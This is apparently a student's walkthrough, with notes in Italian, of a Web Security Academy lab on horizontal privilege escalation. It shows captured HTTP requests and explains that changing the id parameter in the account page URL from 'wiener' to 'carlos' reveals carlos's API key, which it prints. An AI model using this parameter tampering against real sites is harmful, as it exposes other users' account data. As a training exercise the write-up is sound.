
> This lab has a horizontal privilege escalation vulnerability on the user account page.
> To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.
> You can log in to your own account using the following credentials: `wiener:peter`


wiener api key: `fS972xHPicmUo3ncyLkGK62epY69N8Ry`

```
POST /my-account/change-email HTTP/2
Host: 0a6f002904696b828013534900fe008d.web-security-academy.net
Cookie: session=yyjMKzjjoCfdm1uLRuexfVYQ2KDHfzGN
Content-Length: 56
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT
Upgrade-Insecure-Requests: 1
Origin: https://0a6f002904696b828013534900fe008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6f002904696b828013534900fe008d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=asd%40asd.it&csrf=TmPxB0ZVdp5nDDfKSvQPUQs32orOIPLA
```

facendo la GET per visualizzare la pagina del proprio profilo, si nota che c'è il parametro `wiener`

basta cambiarlo e si ottiene l'API key di carlos

```bash
GET /my-account?id=carlos HTTP/2 <===========================
Host: 0a6f002904696b828013534900fe008d.web-security-academy.net
Cookie: session=A4VefzyeGI7OGiAjBhQPzVAZT2EWptAS
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
..
..
```


```html
<div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: wMZKCRiNxdfoMBJbD3SCqYZIA4dZ1HSR</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
```


